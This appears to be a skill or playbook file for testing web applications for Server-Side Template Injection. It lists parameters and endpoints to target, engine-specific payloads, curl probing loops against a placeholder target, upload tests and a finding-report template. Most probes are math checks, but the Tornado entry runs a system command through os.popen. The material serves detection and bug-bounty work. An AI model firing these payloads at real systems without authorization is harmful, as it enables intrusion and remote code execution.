---
description: Find Server-Side Template Injection vulnerabilities in web applications. Use when testing for SSTI issues.
---

# SSTI Vulnerability Testing Tool

This tool identifies Server-Side Template Injection (SSTI) vulnerabilities using real-world testing methodology.

## High-Value Patterns

### Parameter Names
- `name`, `username`, `first_name`, `last_name`
- `title`, `subject`, `message`, `content`, `body`
- `template`, `page`, `layout`, `view`, `render`
- `search`, `q`, `query`, `keyword`
- `email`, `comment`, `description`, `note`
- `filename`, `report_name`, `label`

### Endpoint Patterns
- `/search`, `/search?q=`, `/results`
- `/preview`, `/render`, `/template`
- `/profile`, `/settings`, `/account`
- `/contact`, `/feedback`, `/support`
- `/export`, `/download`, `/generate`
- `/email/preview`, `/notification/preview`
- Any endpoint reflecting user input in HTML response

### Template Engines and Detection Payloads

```bash
# Ordered by popularity in bug bounty reports

# Jinja2 / Twig (Python/PHP)
{{7*7}}
{{7*'7}}

# Mako (Python)
<% print(7*7) %>

# ERB (Ruby)
<%= 7*7 %>

# Smarty (PHP)
{7*7}

# Pug / Jade (Node.js)
#{7*7}

# Freemarker (Java)
${7*7}

# Velocity (Java)
#set($x=7*7)${x}

# Tornado (Python)
{% import os %}{{ os.popen('id').read() }}

# Handlebars (Node.js)
{{#with "s" as |string|}}{{string.sub "hello" 0 1}}{{/with}}

# Nunjucks (Node.js)
{{range.constructor("return 7*7")()}}
```

## Testing Methodology

### Step 1 — Identify reflection points

```bash
# Find all parameters that reflect user input in responses
curl -s "https://<target>/search?q=FUZZTEST12345" | grep -c "FUZZTEST12345"

# Test each discovered parameter
for param in q search name title content body message; do
    RESP=$(curl -s "https://<target>?${param}=SSTIPROBE" | grep -c "SSTIPROBE")
    if [ "$RESP" -gt 0 ]; then
        echo "[+] Reflected: ${param}"
    fi
done
```

### Step 2 — Math-based detection (safe, no exploitation)

Inject `{{7*7}}` and look for `49` in response:

```bash
# Safe detection — only checks for mathematical evaluation
curl -s "https://<target>/search?q={{7*7}}" | grep "49"
curl -s -X POST "https://<target>/preview" \
  -d "content={{7*7}}" | grep "49"

# If 49 appears where {{7*7}} was reflected → SSTI confirmed
```

### Step 3 — Engine fingerprinting

Once math works, identify the engine:

```bash
# Jinja2 — string multiplication
curl -s "https://<target>/?name={{7*'7'}}" | grep "7777777"

# ERB
curl -s "https://<target>/?name=<%= 7*7 %>" | grep "49"

# Smarty
curl -s "https://<target>/?name={7*7}" | grep "49"

# Freemarker
curl -s 'https://<target>/?name=${7*7}' | grep "49"

# Mako
curl -s "https://<target>/?name=<% print(7*7) %>" | grep "49"

# Tornado
curl -s 'https://<target>/?name={% set x = 7*7 %}{{x}}' | grep "49"
```

### Step 4 — Context detection

SSTI can appear in different contexts:

```bash
# HTML context — {{7*7}} reflected as 49
# JavaScript context — {{7*7}} might be in a JS string
# Attribute context — might need escaping

# Test with surrounding markers
curl -s 'https://<target>/?name=BEFORE{{7*7}}AFTER' | grep "BEFORE49AFTER"
curl -s 'https://<target>/?name=">{{7*7}}' | grep ">49"
curl -s "https://<target>/?name={{7*7}}<!--" | grep "49"
```

### Step 5 — POST body testing

Many SSTI are in POST parameters:

```bash
# Form-encoded
curl -s -X POST "https://<target>/contact" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name={{7*7}}&email=test@test.com&message=hello" | grep "49"

# JSON
curl -s -X POST "https://<target>/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template":"{{7*7}}"}' | grep "49"

# XML
curl -s -X POST "https://<target>/api/process" \
  -H "Content-Type: application/xml" \
  -d '<name>{{7*7}}</name>' | grep "49"
```

### Step 6 — File upload context

```bash
# Filename-based SSTI
echo "test" > '{{7*7}}.txt'
curl -s -X POST "https://<target>/upload" \
  -F "file=@{{7*7}}.txt" | grep "49"

# SVG upload (XML-based templates)
cat > payload.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <text>{{7*7}}</text>
</svg>
EOF
curl -s -X POST "https://<target>/upload" \
  -F "file=@payload.svg" | grep "49"
```

## Severity Rating

| Condition | Severity |
|---|---|
| SSTI with RCE capability confirmed | Critical |
| SSTI with file read capability | High |
| SSTI with information disclosure | Medium |
| SSTI in sandboxed/limited context | Low |

## False Positives to Ignore

- `49` appearing in page unrelated to reflection (e.g., page numbers, counters)
- Mathematical expressions in JavaScript that are client-side evaluated
- Template syntax in comments or pre-rendered content
- CSP-blocked script injection confused with SSTI
- `{{7*7}}` reflected literally (no evaluation = no SSTI)

## Finding Report Template

```json
{
  "type": "ssti",
  "severity": "<Critical|High|Medium>",
  "endpoint": "<affected endpoint>",
  "parameter": "<vulnerable parameter>",
  "engine": "<detected template engine>",
  "description": "SSTI in <param> on <endpoint>. Injecting {{7*7}} results in 49 being rendered, confirming <engine> template injection.",
  "evidence": "Request: <curl command>\nResponse: <relevant response showing 49>",
  "curl_command": "<exact reproduction command>",
  "impact": "An attacker can execute arbitrary code on the server by injecting template directives. This can lead to full RCE depending on the template engine."
}
```
